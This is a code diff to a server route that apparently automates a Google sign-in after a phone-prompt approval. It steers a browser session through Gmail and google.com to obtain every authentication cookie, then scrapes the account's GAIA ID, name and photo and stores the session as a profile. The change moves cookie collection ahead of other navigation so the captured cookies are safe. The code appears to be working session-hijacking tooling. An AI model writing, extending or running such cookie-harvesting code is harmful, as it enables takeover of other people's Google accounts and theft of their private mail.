@@ -472,78 +472,58 @@ router.get('/:id/status', async (req: Request, res: Response) => {
     const result = await googleAuthService.pollDpCompletion(id);
 
     if (result.status === 'AUTHENTICATED') {
-      // Race condition guard — concurrent polls both see AUTHENTICATED; only the first proceeds
       if (finalizingSessions.has(id)) {
-        return res.json({ status: 'COMPLETED' });
+        return res.json({ status: 'PENDING' });
       }
       finalizingSessions.add(id);
 
       try {
-        logger.info(`[DP] Phone approved — session ${id}, navigating for full cookie issuance...`);
+        logger.info(`[DP] navigating for full cookie issuance — session ${id}`);
 
-        // 3-step navigation to trigger ALL auth cookies:
-        // Step 1: Gmail → OSID, COMPASS, GMAIL_AT, GMAIL_LF
-        await session.page.goto('https://mail.google.com/mail/u/0/', {
-          waitUntil: 'domcontentloaded',
-          timeout: 30000,
-        });
-        await session.page.waitForLoadState('networkidle', { timeout: 15000 }).catch(() => {});
-        await session.page.waitForTimeout(5000); // allow __Host-GMAIL_SCH_* service worker init
+        // Step 1: Gmail (5s)
+        await session.page.goto('https://mail.google.com/', { waitUntil: 'domcontentloaded', timeout: 20000 }).catch(() => {});
+        await session.page.waitForTimeout(5000);
 
-        // Step 2: google.com → AEC, __Secure-BUCKET, NID, SEARCH_SAMESITE
-        await session.page.goto('https://www.google.com/', {
-          waitUntil: 'domcontentloaded',
-          timeout: 20000,
-        });
-        await session.page.waitForLoadState('networkidle', { timeout: 10000 }).catch(() => {});
-        await session.page.waitForTimeout(3000); // allow __Secure-BUCKET to be set
+        // Step 2: Google main (3s)
+        await session.page.goto('https://www.google.com/', { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
+        await session.page.waitForTimeout(3000);
 
-        // Step 3: back to Gmail → finalise __Host-GMAIL_SCH_* and all Gmail cookies
-        await session.page.goto('https://mail.google.com/mail/u/0/', {
-          waitUntil: 'domcontentloaded',
-          timeout: 30000,
-        });
-        await session.page.waitForLoadState('networkidle', { timeout: 15000 }).catch(() => {});
-        await session.page.waitForTimeout(8000); // allow __Host-GMAIL_SCH_* to fully initialise
+        // Step 3: Gmail again (8s)
+        await session.page.goto('https://mail.google.com/', { waitUntil: 'domcontentloaded', timeout: 20000 }).catch(() => {});
+        await session.page.waitForTimeout(8000);
 
-        // Capture GAIA ID — navigate to accounts.google.com and call ListAccounts
-        // as a same-origin fetch so LSID (SameSite=Strict) is automatically included
+        // Collect cookies FIRST before any further navigation
+        const cookies = await session.page.context().cookies();
+        logger.info(`[DP] cookies collected: ${cookies.length} total`);
+
+        // GAIA extraction — best-effort, cookies already safe above
         let dpGaiaId = '';
         let dpFullName = '';
         let dpPictureUrl = '';
         try {
-          await session.page.goto('https://accounts.google.com/', {
-            waitUntil: 'domcontentloaded',
-            timeout: 15000,
-          }).catch(() => {});
-
+          await session.page.goto('https://accounts.google.com/', { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
           const laRaw = await session.page.evaluate(async () => {
-            const resp = await fetch('/ListAccounts?gpsia=1&json=1', {
-              credentials: 'include',
-            });
-            return resp.text();
+            try {
+              const resp = await fetch('/ListAccounts?gpsia=1&json=1', { credentials: 'include' });
+              return resp.text();
+            } catch (e) { return ''; }
           }).catch(() => '');
 
-          logger.info(`[GAIA][DP] ListAccounts raw (first 200 chars): ${laRaw.slice(0, 200)}`);
+          logger.info(`[GAIA][DP] ListAccounts raw: ${laRaw?.slice(0, 200)}`);
 
-          if (laRaw && !laRaw.startsWith('<')) {
-            const laJson = JSON.parse(laRaw.replace(")]}'\n", '').trim());
-            const account = laJson?.[1]?.[0];
+          if (laRaw && laRaw.includes('gaia.l.a')) {
+            const json = JSON.parse(laRaw.replace(/^\)\]\}'\n/, ''));
+            const account = json[1]?.[0];
             if (account) {
-              dpGaiaId     = String(account[2] || '');
-              dpFullName   = String(account[3] || '');
-              dpPictureUrl = String(account[4] || '');
+              dpGaiaId    = String(account[2] ?? '');
+              dpFullName  = String(account[3] ?? '');
+              dpPictureUrl = String(account[4] ?? '');
+              logger.info(`[GAIA][DP] ID: ${dpGaiaId}, name: ${dpFullName}`);
             }
-            logger.info(`[GAIA][DP] ID: ${dpGaiaId} | Name: ${dpFullName}`);
           }
-        } catch (e: any) {
-          logger.warn(`[GAIA][DP] ListAccounts fetch failed: ${e.message}`);
+        } catch (gaiaErr: any) {
+          logger.warn(`[GAIA][DP] extraction failed (non-fatal): ${gaiaErr.message}`);
         }
-
-        logger.success(`[DP] Phone approved — session ${id}, extracting cookies now`);
-
-        // Extract cookies AFTER full navigation sequence
-        const cookies = await session.page.context().cookies();
 
         await createProfileFromSession(id, cookies, dpGaiaId, dpFullName, dpPictureUrl);
 
